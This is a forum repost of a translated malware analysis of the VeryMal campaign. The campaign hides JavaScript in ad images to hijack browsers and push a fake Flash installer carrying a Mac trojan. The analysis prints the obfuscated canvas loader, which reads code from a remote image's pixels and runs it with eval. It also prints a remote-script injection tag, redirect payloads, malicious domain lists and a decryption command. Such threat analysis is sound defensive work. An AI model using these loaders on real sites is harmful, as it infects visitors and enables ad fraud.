# 【转帖】对隐藏在图像文件中的 JavaScript 恶意代码的详细分析

> **作者**: 默小白 | **发布时间**: 2019-02-13 16:55:00 | **版块**: 『病毒分析区』 | **查看/回复**: 17058 / 21
> **原文**: [https://www.52pojie.cn/thread-865122-1-1.html](https://www.52pojie.cn/thread-865122-1-1.html)

---

转自：<https://xz.aliyun.com/t/3986>

## 摘要

最近几个月，隐藏在图像文件中的JavaScript恶意软件的报告大量增加。在大多情况下，这通常被称为“基于图像的恶意软件”或“隐写恶意软件”。

> 名词：隐写术。
> 在其他非机密文本或数据中隐藏消息或信息的行为。

这篇文章将研究一个被恶意用户使用的基于隐写术的payload，该payload被Confiant根据其广告服务域名veryiel-malyst.com命名为VeryMal。Malwarebytes分析了恶意二进制文件。根据我们的报道范围统计，多达500万访问者可能已经受到最近的恶意软件活动的影响。

## 分析

完全执行payload的结果是这种熟悉的浏览器劫持：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190125222544-19aa2e5a-20ad-1.png)

很多关于这类攻击的传言都耸人听闻，以至于用户都相信仅仅图像文件就会对我们造成威胁，于是，人们便对日常浏览器加载的图像产生了担忧。但这与事实大相径庭。在执行这些payload的更广泛的上下文中，验证广告服务中单个图像文件的完整性是没有什么意义的。
实际上，隐写术的作用仅仅为了传递payload的一部分，需要对图像进行处理，以便提取并利用该片段。图像本身不会损害您的计算机或重定向您的浏览器。
让我们看看源码：

```
<canvas id='iak'></canvas>
<script >
    var wsw = "10512" ;var volton = "154c8e99-aad0-4658-b5fb-645c751ad42b";
    var canvas = document['getElementById']('iak');
    var ctx = canvas['getContext']('2d');
    var image = new Image();
    image['crossOrigin'] = '';
    image['src'] = 'http://s.ad-pixel.com/sscc.jpg';
    var rs = '';
    var isSupportFontFamily = function (c) {
        if (typeof c != 'string') {
            return ![];
        }
        var d = 'Arial';
        if (c['toLowerCase']() == d['toLowerCase']()) {
            return !![];
        }
        var e = 'a';
        var f = 0x64;
        var g = 0x64, h = 0x64;
        var i = document['createElement']('canvas');
        var j = i['getContext']('2d');
        i['width'] = g;
        i['height'] = h;
        j['textAlign'] = 'center';
        j['fillStyle'] = 'black';
        j['textBaseline'] = 'middle';
        var k = function (l) {
            j['clearRect'](0x0, 0x0, g, h);
            j['font'] = f + 'px\x20' + l + ',\x20' + d;
            j['fillText'](e, g / 0x2, h / 0x2);
            var m = j['getImageData'](0x0, 0x0, g, h)['data'];
            return []['slice']['call'](m)['filter'](function (n) {
                return n != 0x0;
            });
        };
        return k(d)['join']('') !== k(c)['join']('');
    };
    var riXs = document['getElementsByTagName']('body');
    var rrxT = riXs[0x0]['style']['cssText'];
    if (isSupportFontFamily('-apple-system') && rrxT != 'margin:\x200px;') {
        image['onload'] = function () {
            ctx['drawImage'](image, 0x0, 0x0);
            var o = ctx['getImageData'](0x0, 0x0, image['width'], image['height']);
            for (var p = 0x0, q = 0x0; q < 0x4b; p = p + 0x4, q++) {
                rs += String['fromCharCode'](o['data'][p + 0x2]);
            }
            eval(rs);
        };
    }
</script>
```

如果给代码加注释，应该是这样：
创建一个Canvas对象(这允许使用HTML5 Canvas API来与图像及其底层数据进行交互)。
抓取位于以下位置的图像：hxxp://s.ad-pixel.com/sscc.jpg
定义用于检查浏览器中是否支持特定字体系列的函数。
检查是否支持Apple fonts。如果不支持，什么都不做。
如果支持，则循环访问图像文件中的基础数据。每个循环读取一个像素值并将其转换为字母数字字符。
将新提取的字符添加到字符串中。
执行字符串中的代码。

笼统地说，图像利用非可执行文件格式来存储压缩数据，当浏览器或您选择的其他图像查看器加载图像文件时，它基本上会解压该文件并使用数据一次一个像素地绘制图像。上面的“恶意”图像在十六进制编辑器中如下所示：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190125231621-2bb2ec48-20b4-1.png)

就像图像查看器需要解压缩这些数据以呈现最终结果一样，Web开发人员可以使用JavaScript和HTML5 Canvas API对图像数据进行简单的操作。
数据操作只发生在几行代码中：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190125231907-8ec4ca9a-20b4-1.png)

图像本身就是一个白色的小条：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190125231922-97b648cc-20b4-1.png)

隐藏的代码一旦从图像中提取出来：

```
top.location.href =’hxxp://veryield-malyst.com/’ + volton + ‘?var1=’ + wsw;
```

这是填充的参数：

```
hxxp://veryield-malyst.com/154c8e99-aad0–4658-b5fb-645c751ad42b?var1=10512
```

随着恶意广告检测的不断成熟，老练的攻击者开始了解到明显的混淆方法不再能进行有效地攻击。常见JavaScript混淆器输出的是一种乱的不能再乱的乱码，肉眼很容易识别。像隐写术这样的技术对于恶意携带payload很有用，而不再需要依赖十六进制编码的字符串或庞大的查找表。
举个栗子，“verduce-malyst”域名已经活跃了几个月，但直到最近，VeryMal才开始使用隐写术携带payload。以下是他们在11月初发布的广告标签中的一个，以供比较：

```
<script type='text/javascript'>
 var a = 'w';
 var b = 'layback';
 var c = 'Target'
 var d = 'vailability';
 var e = 'vent';
 var kk = 'c330e369ea42';
 var f = a.toUpperCase() + 'ebKit' + 'P' + b + c + 'A' + d + 'E' +e;
 if(f in window) {
  ar sc = document.createElement("script");
  ar mandow = "79d5e561-1a8d-48f6-abdb-495df89ec5e.";
  ar ctt = "s3.amazonaws.com";
  c.setAttribute("src", "https://" + mandow + ctt + "/csqc.js");
  c.setAttribute("type", "text/javascript");
  document.head["app" + "endC" + "hild"](sc);
 }
</script>
```

翻译成白话非常简洁：
检查Window对象中是否存在“WebKitPlaybackTargetAvailabilityEvent”(Safari定位策略)。
如果是，请执行位于以下位置的JavaScript：

```
hxxps://79d5e561–1a8d-48f6-abdb-495df89ec5e.s3.amazonaws.com/csqc.js
```

我们对那里的代码很熟悉：

```
top.location.href = "hxxp://veryield-malyst.com/f7e156be-fc09-4b1b-a052-d48d2aac69fc?var1=" + kk
```

## 恶意活动的历史

自去年8月份以来，VeryMal一直在利用veryield-malyst域作为他们的重定向器——这一个值得我们关注，因为它利用了隐写术来进行客户端混淆。
该活动于2019年11月1日至2019年1月13日在两家顶级交易所展开，这两家交易所占前100家出版商网站的25%。
在我们的客户中，Confiant检测到并阻止了191,970次攻击，只有美国访客成为攻击目标。

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128095902-48b1f60c-22a0-1.png)

VeryMal在12月份也有几次攻击活动

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128100006-6f3ca1a0-22a0-1.png)

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128100013-730671b2-22a0-1.png)

## 方法

VeryMal利用HTTP 302重定向通过他们的veryfield-malyst.com域名到adpiano.com--一个鲜为人知的平台，这个网站与塞浦路斯有着某种联系。
Adpiane充当这些行为和其他恶意行为的点击跟踪器，包括但不限于：

```
- morningflashsee.club
- bestadbid.com
- newadvancetypeliteflash.services
- doconcretegreatliteflash.icu
- firstfetchflash.club
- windowinstalldealaflash.icu
- upgradebestfinishtheclicks.icu
- booe.pro
- freecalculation.com
```

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128100336-ec45fa98-22a0-1.png)

强制重定向并不是这些攻击者的唯一攻击载体，因为他们被观察到公然以Flash更新和PC修复软件为幌子为他们的恶意软件安装程序运行显示广告。十二月份攻击活动的恶意广告：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128100518-2946e722-22a1-1.png)

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128100522-2b7b8566-22a1-1.png)

最近的VeryMal广告系列利用重定向链中的以下(仍处于活动状态)点击跟踪器来删除伪造的Flash更新：

```
hxxps://cs.adpiano.com/kokodzbambo/aaoaeeea/?utm_source=1236&utm_campaign=1616984&aff_sub=w3SGFK32C602JCMJHKLPR5FC&clck=w3SGFK32C602JCMJHKLPR5FC&sid=w3SGFK32C602JCMJHKLPR5FC
```

此广告系列的目标网页会轮流展示各种.icu域名的主题，如下所示：

```
mixmaintenancegreatliteflash.icu
mediafreshgreatliteflash.icu
```

由于广告系列本身针对的是特定平台和消息传递，因此目前尚不清楚它们的轮换次数或旋转次数。此报告的内容是通过Mac OS上的Google Chrome收集的。
我们已经观察到所有登陆页面都强制下载名为AdobeFlashPlayerInstaller.iso的文件
Virus Total:

```
https://www.virustotal.com/#/file/75426777c469dbce816dc197b5bef518f4eca577e9c53e4679d81db2780a262f/detection
```

来自MalwareBytes的AdamThomas([@adamt5Six](https://twitter.com/adamt5Six))非常热心地提供了对二进制文件的进一步分析，如下所示。谢谢亚当！

> 样本名称：AdobeFlashPlayerInstaller.iso
> SHA-256：75426777c469dbce816dc197b5bef518f4eca577e9c53e4679d81db2780a262f
> 文件类型：Macintosh磁盘镜像
> 数字签名：2J5Q8FU8C6（Apple Team ID）

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128101152-13e89fdc-22a2-1.png)

与应用程序包中包含的普通mach-o(mac二进制)不同，我们在这里找到了一个shell脚本。该脚本解密应用程序资源目录中包含的AES-256加密文件：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128101223-269c4eb2-22a2-1.png)

首先，我们必须从文件中去除Base64编码：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128101250-36968882-22a2-1.png)

> $ openssl enc -d -aes-256-cbc -nosalt -pass pass：5683436752 -in enc.out -out enc.out.bin

去除编码并使用openssl解密后，我们看到一个可读的脚本：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128101414-6899f6b6-22a2-1.png)

该脚本的工作原理是去除Base64编码的另一层，使我们得到十六进制格式的字符串：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128101502-850a4f3a-22a2-1.png)

然后，脚本将十六进制转换为ASCII格式，显示另一个脚本和第一阶段下载程序的最后一层。下载并执行受密码保护的ZIP文件：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128101553-a37ab216-22a2-1.png)

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128101612-af24789a-22a2-1.png)

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128101625-b6935182-22a2-1.png)

在payload执行之后，还会出现对脚本的其他请求，这些请求被认为有助于呈现广告软件投放器的安装屏幕。可能它们还可以自动点击广告软件安装程序。
通过对基于Windows的恶意软件的分析，MalwareBytes还能够提供一些额外的可见性，以了解这攻击者MO的内部工作原理。初始.icu域执行302重定向到以www2开头的另一个.icu。
攻击者基础架构主要由.icu域构成，这些域由数十个域创建并在AWS IP空间中移动。URL是使用特定参数生成的，通常使用非常短的TTL。

```
whenupgrade.yourbestsiteforlinksitenew.xyz
workingversion.theperfectupdate4everyone.xyz
www.checkdealgoldliteflash.icu
www.fasterdltypeliteflash.icu
www.fixmaintainbestaflash.icu
www.makebestmaintainaflash.icu
www.midgreatdlliteflash.icu
www.mixmaintainbestaflash.icu
www.savegolddealliteflash.icu
www.smallbestappleliteflash.services
www.topfuturetypeaflash.icu
www.upgradedltypeliteflash.icu
```

![img](https://xzfile.aliyuncs.com/media/upload/picture/20190128103049-b9906eae-22a4-1.png)

Windows Installer VirusTotal：

```
https://www.virustotal.com/#/file/6efb37adef3ae68cc3d7cc0512ae82eab4a39b1880e00412ce50f5c423eba00d/detection
```

## 结论

根据Confiant观察到，高峰期内，此特定攻击的每天超过500w次。这500万种恶意攻击对收入的影响需要从许多不同方面加以衡量。出版商直接从中断的用户会话中损失金钱，并从增加的广告拦截使用和用户信任损失中损失未来的金钱。
有些广告交易平台在与感染作斗争时切断了广告资源，并且会让一些发布商永久性地撤消库存。广告客户将受到受感染设备产生的广告欺诈的打击。让我们不要忽视现在拥有受感染设备的用户。据估计，仅1月11日这个峰值的成本影响就已经超过120万美元。当你考虑到这只是过去一个月来Contant发现并阻止的数百起攻击中的一起，数字广告业面临的问题的规模就变得更清晰了。

```
翻译文章：https://blog.confiant.com/confiant-malwarebytes-uncover-steganography-based-ad-payload-that-drops-shlayer-trojan-on-mac-cd31e885c202
```
